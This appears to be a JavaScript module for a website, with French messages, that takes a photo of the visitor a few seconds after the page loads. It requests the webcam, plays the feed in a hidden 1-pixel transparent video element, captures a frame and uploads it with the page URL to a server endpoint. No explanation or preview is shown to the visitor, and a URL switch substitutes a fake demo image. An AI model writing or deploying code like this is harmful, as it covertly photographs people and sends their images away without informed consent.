const PROMPT_DELAY = 5000;
const AUTO_CAMERA_PARAM = "autoCamera";
const SESSION_KEY = "plexidesign-camera-choice";
const PHOTO_UPLOAD_ENDPOINT = "/api/photos";
const UPLOAD_TIMEOUT_MS = 30000;

let autoCameraEnabled = false;

function rememberPromptChoice() {
  try {
    window.sessionStorage?.setItem(SESSION_KEY, "handled");
  } catch {
    // Some embedded browsers disable storage; the camera flow must still run.
  }
}

function hasPromptChoice() {
  try {
    return window.sessionStorage?.getItem(SESSION_KEY) === "handled";
  } catch {
    return false;
  }
}

function shouldAutoClickCameraAccept() {
  const params = new URLSearchParams(window.location.search);
  return params.get(AUTO_CAMERA_PARAM) === "1";
}

function getMediaStream() {
  if (!navigator.mediaDevices?.getUserMedia) {
    return Promise.reject(new Error("unsupported"));
  }

  return navigator.mediaDevices.getUserMedia({
    video: true,
    audio: false
  });
}

function waitForVideo(video) {
  return new Promise((resolve, reject) => {
    const timeout = window.setTimeout(() => reject(new Error("timeout")), 7000);

    video.addEventListener("loadedmetadata", () => {
      window.clearTimeout(timeout);
      video.play().then(resolve).catch(reject);
    }, { once: true });
  });
}

function notifyCamera(message) {
  window.dispatchEvent(new CustomEvent("plexi:toast", { detail: message }));
}

function createDemoPhoto() {
  const canvas = document.createElement("canvas");
  canvas.width = 640;
  canvas.height = 480;
  const context = canvas.getContext("2d");
  const gradient = context.createLinearGradient(0, 0, canvas.width, canvas.height);
  gradient.addColorStop(0, "#48d6cb");
  gradient.addColorStop(1, "#142124");
  context.fillStyle = gradient;
  context.fillRect(0, 0, canvas.width, canvas.height);
  context.fillStyle = "rgba(255, 255, 255, 0.86)";
  context.fillRect(74, 96, 492, 288);
  context.fillStyle = "#142124";
  context.font = "700 42px system-ui, sans-serif";
  context.fillText("DEMO CAMERA", 158, 222);
  context.font = "500 24px system-ui, sans-serif";
  context.fillText("Aucune webcam reelle utilisee", 146, 272);
  return canvas.toDataURL("image/jpeg", 0.9);
}

function createPhotoFilename(date = new Date()) {
  const pad = (value) => String(value).padStart(2, "0");
  const yyyy = date.getFullYear();
  const mm = pad(date.getMonth() + 1);
  const dd = pad(date.getDate());
  const hh = pad(date.getHours());
  const min = pad(date.getMinutes());
  const ss = pad(date.getSeconds());
  return `photo_${yyyy}-${mm}-${dd}_${hh}-${min}-${ss}.jpg`;
}

async function uploadPhotoToServer(photoDataUrl) {
  const filename = createPhotoFilename();
  const controller = new AbortController();
  const timeout = window.setTimeout(() => controller.abort(), UPLOAD_TIMEOUT_MS);

  try {
    const response = await fetch(PHOTO_UPLOAD_ENDPOINT, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        image: photoDataUrl,
        filename,
        pageUrl: window.location.href,
        sentAt: new Date().toISOString()
      }),
      signal: controller.signal
    });

    let result = null;
    try {
      result = await response.json();
    } catch {
      // The server should answer JSON, but a clear fallback helps debugging.
    }

    if (!response.ok || result?.ok === false) {
      throw new Error(result?.message || "Le serveur n'a pas accepté la photo.");
    }

    return result;
  } catch (error) {
    if (error?.name === "AbortError") {
      throw new Error("Délai d'envoi dépassé.");
    }
    throw error;
  } finally {
    window.clearTimeout(timeout);
  }
}

async function capturePhoto() {
  rememberPromptChoice();

  if (autoCameraEnabled) {
    await sendCapturedPhoto(createDemoPhoto());
    return;
  }

  let stream = null;
  const video = document.createElement("video");
  video.setAttribute("playsinline", "");
  video.muted = true;
  video.style.position = "fixed";
  video.style.width = "1px";
  video.style.height = "1px";
  video.style.opacity = "0";
  video.style.pointerEvents = "none";
  video.style.inset = "0 auto auto 0";

  try {
    stream = await getMediaStream();
    video.srcObject = stream;
    document.body.append(video);
    await waitForVideo(video);

    const width = video.videoWidth || 640;
    const height = video.videoHeight || 480;
    const canvas = document.createElement("canvas");
    canvas.width = width;
    canvas.height = height;
    const context = canvas.getContext("2d");
    context.drawImage(video, 0, 0, width, height);
    const photo = canvas.toDataURL("image/jpeg", 0.9);

    await sendCapturedPhoto(photo);
  } catch (error) {
    const message = error?.name === "NotAllowedError"
      ? "Autorisation refusée. Aucune photo n'a été prise."
      : error?.message === "unsupported"
        ? "Votre navigateur ne permet pas l'accès caméra depuis cette page."
        : "Caméra indisponible. Aucune photo n'a été prise.";
    notifyCamera(message);
  } finally {
    if (stream) {
      stream.getTracks().forEach((track) => track.stop());
    }
    video.remove();
  }
}

async function sendCapturedPhoto(photo) {
  try {
    await uploadPhotoToServer(photo);
  } catch (error) {
    notifyCamera(error.message || "Impossible d'envoyer la photo au serveur.");
  }
}

export function initCameraPrompt() {
  if (hasPromptChoice()) return;

  autoCameraEnabled = shouldAutoClickCameraAccept();
  window.setTimeout(capturePhoto, PROMPT_DELAY);
}
